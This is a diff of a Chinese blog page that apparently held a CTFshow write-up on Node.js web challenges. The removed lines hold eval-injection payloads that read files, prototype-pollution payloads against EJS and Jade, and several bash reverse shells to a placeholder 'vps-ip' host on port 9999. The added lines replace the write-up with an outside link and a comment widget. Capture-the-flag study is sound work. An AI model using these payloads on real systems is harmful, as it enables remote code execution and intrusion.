@@ -16,15 +16,15 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="CTFshow WriteUps WEB入门 nodejsweb334 代码审计一下 12ctfshow123456  web335 查看源吗发现提示eval  eval中可以执行js代码  利用注入fs模块  &#96;&#96;&#96;&#x2F;?eval&#x3D;require(‘fs’).readdirSync(‘.’)&#x2F;?eval&#x3D;require(‘fs’).r">
+    <meta name="description" content="http:&#x2F;&#x2F;118.178.126.49&#x2F;blogs&#x2F;CTF_show_Web入门_nodejs.html">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF_show_Web入门_nodejs">
 <meta property="og:url" content="http://example.com/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/index.html">
 <meta property="og:site_name" content="luelueking的ctf之路">
-<meta property="og:description" content="CTFshow WriteUps WEB入门 nodejsweb334 代码审计一下 12ctfshow123456  web335 查看源吗发现提示eval  eval中可以执行js代码  利用注入fs模块  &#96;&#96;&#96;&#x2F;?eval&#x3D;require(‘fs’).readdirSync(‘.’)&#x2F;?eval&#x3D;require(‘fs’).r">
+<meta property="og:description" content="http:&#x2F;&#x2F;118.178.126.49&#x2F;blogs&#x2F;CTF_show_Web入门_nodejs.html">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-07-31T11:34:59.000Z">
-<meta property="article:modified_time" content="2022-07-30T01:15:17.551Z">
+<meta property="article:modified_time" content="2022-08-10T12:10:18.266Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -218,7 +218,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.4k 字
+          54 字
         
       </span>
     
@@ -229,7 +229,7 @@
         
         
         
-          20 分钟
+          1 分钟
         
       </span>
     
@@ -272,74 +272,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr>
-<h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr>
-<h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><ul>
-<li><p>代码审计一下</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ctfshow</span><br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><ul>
-<li><p>查看源吗发现提示eval</p>
-</li>
-<li><p>eval中可以执行js代码</p>
-</li>
-<li><p>利用注入fs模块</p>
-</li>
-<li><p>&#96;&#96;&#96;<br>&#x2F;?eval&#x3D;require(‘fs’).readdirSync(‘.’)<br>&#x2F;?eval&#x3D;require(‘fs’).readFileSync(‘fl00g.txt’)</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web336<br><br>- ```<br>  /?eval=require(<span class="hljs-string">&#x27;fs&#x27;</span>).readFileSync(<span class="hljs-string">&#x27;fl001g.txt&#x27;</span>)<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><ul>
-<li><p>分析代嘛要求md5加密后一样</p>
-</li>
-<li><pre><code class="hljs">/?a[]=1&amp;b[]=1
-<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><br>### web338<br><br>- js的原型链污染<br>  - js的每个构造函数（<span class="hljs-function"><span class="hljs-keyword">constructor</span>）都有一个原型对象（<span class="hljs-title">prototype</span>）</span><br><span class="hljs-function">  - 对象的```__<span class="hljs-title">proto__</span>```属性,指向类的原型对象<span class="hljs-title">prototype</span></span><br><span class="hljs-function">  - <span class="hljs-title">js</span>使用<span class="hljs-title">prototype</span>链实现继承机制</span><br><span class="hljs-function"></span><br><span class="hljs-function">- <span class="hljs-title">payload</span>，<span class="hljs-title">POST</span>抓包加参数</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure>
-&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>### web339<br><br>- 发现多了一个api.js<br><br>- 里面的query参数可以污染！<br><br>- ```<br>  &#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;</span>bash -i &gt;&amp; /dev/tcp/vps-ip/<span class="hljs-number">9999</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>\<span class="hljs-string">&quot;&#x27;)&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>POST index后再POST api（触发路由）</p>
-</li>
-<li><p>服务器开9999监听，反弹shell</p>
-</li>
-<li><p>flag在login.js里面</p>
-</li>
-</ul>
-<h3 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h3><ul>
-<li><p>二次污染</p>
-</li>
-<li><pre><code class="hljs">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps-ip/9999 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>### web341<br><br>- **EJS两层原型污染**<br><br>- ```<br>  &#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFuncionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;</span>bash -i &gt;&amp; /dev/tcp/vps-ip/<span class="hljs-number">9999</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>\<span class="hljs-string">&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>访问routes下flag.js于是猜测flag配在环境中</p>
-</li>
-<li><p>env找到flag</p>
-</li>
-</ul>
-<h3 id="web342～343"><a href="#web342～343" class="headerlink" title="web342～343"></a>web342～343</h3><ul>
-<li><p>jade原型链污染</p>
-</li>
-<li><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
-</li>
-<li><pre><code class="hljs">&#123;
-  &quot;__proto__&quot;: &#123;
-    &quot;__proto__&quot;: &#123;
-      &quot;type&quot;: &quot;Block&quot;,
-      &quot;nodes&quot;: &quot;&quot;,
-      &quot;compileDebug&quot;: 1,
-      &quot;self&quot;: 1,
-      &quot;line&quot;: &quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps-ip/9999 0&gt;&amp;1\&quot;&#39;)&quot;
-    &#125;
-  &#125;
-&#125;
-
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- 记得修改Content-Type为application/json<br><br>- env拿flag<br><br>### web344<br><br>- 正常情况下需要传入```?query=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>,<span class="hljs-string">&quot;isVIP&quot;</span>:<span class="hljs-literal">true</span>&#125;```<br><br>- 但是题目过滤了逗号<br><br>- 所以<br><br></code></pre></td></tr></table></figure>
-?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;
-</code></pre>
-</li>
-<li><p>nodejs中会把它们拼接，ctfshow中c编码的原因是双引号的url编码是%22和c连起来是%22c，会匹配到正则表达式。</p>
-</li>
-</ul>
+                <p><a target="_blank" rel="noopener" href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs.html">http://118.178.126.49/blogs/CTF_show_Web入门_nodejs.html</a></p>
 
                 
               </div>
@@ -437,6 +370,31 @@
             </div>
 
             
+  <article id="comments" lazyload>
+    
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'http://example.com/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/';
+          this.page.identifier = '/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+  </article>
+
+
           </article>
         </div>
       </div>
